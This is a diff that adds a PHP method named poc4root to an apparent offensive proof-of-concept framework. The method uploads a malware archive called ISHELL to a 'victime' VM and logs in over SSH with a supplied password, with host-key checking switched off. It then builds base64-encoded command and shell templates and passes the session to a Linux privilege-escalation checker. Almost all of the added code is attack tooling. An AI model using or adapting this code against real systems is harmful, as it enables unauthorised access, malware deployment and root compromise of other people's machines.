@@ -63,6 +63,55 @@ class poc4lan extends poc4web {
     }
     
     
+    public function poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm){
+        $this->gitre(__FUNCTION__);
+        
+        $eth = trim($eth);
+        $domain = trim($domain);
+        $ip = trim($ip);
+        $port = trim($port);
+        $protocol = trim($protocol);
+        $login = trim($login);
+        $pass = trim($pass);
+        $titre = trim($titre);
+        $fonction2exec = trim($fonction2exec);
+        $vm = trim($vm);
+        $this->titre(__FUNCTION__);
+        
+        $victime = new vm($vm);
+        $victime->vm2upload("$this->dir_tools/Malware/ISHELL-v0.2.tar.gz","$this->vm_tmp_lin/ISHELL-v0.2.tar.gz");
+        
+        $flag_poc = FALSE;
+        $flag_poc = TRUE;
+        
+        $test = new SERVICE4COM($eth,$domain,$ip, $port, $protocol);
+        $test->poc($flag_poc);
+        $stream = $test->stream8ssh8passwd($test->ip, $test->port, $login,$pass);
+        
+        $template_cmd = "sshpass -p '$pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $login@$test->ip -p $test->port -C  '%CMD%'";
+        list($stream,$template_id,$template_cmd,$template_shell) = $test->stream4check($stream,$template_cmd,$login,$pass);
+        
+        if (is_resource($stream)){
+            $templateB64_id = base64_encode($template_id);
+            $templateB64_cmd = base64_encode($template_cmd);
+            $templateB64_shell = base64_encode($template_shell);
+            
+            $data = "/usr/bin/id";
+            $rst_id = $test->stream4result($stream, $data, 10);
+            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $test->parse4id($rst_id);
+            $this->article("CREATE Template ID", $template_id);
+            $this->article("CREATE Template CMD", $template_cmd);
+            $this->article("CREATE Template SHELL", $template_shell);
+            $this->pause();
+            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$user_name_pass);
+            $obj_lan->poc($test->flag_poc);
+            
+            return $obj_lan->$fonction2exec();
+        }
+    }
+    
+    
+    
     public function poc4root8suid8app2find(){
         $this->ssTitre(__FUNCTION__);
         $eth = 'vmnet6';
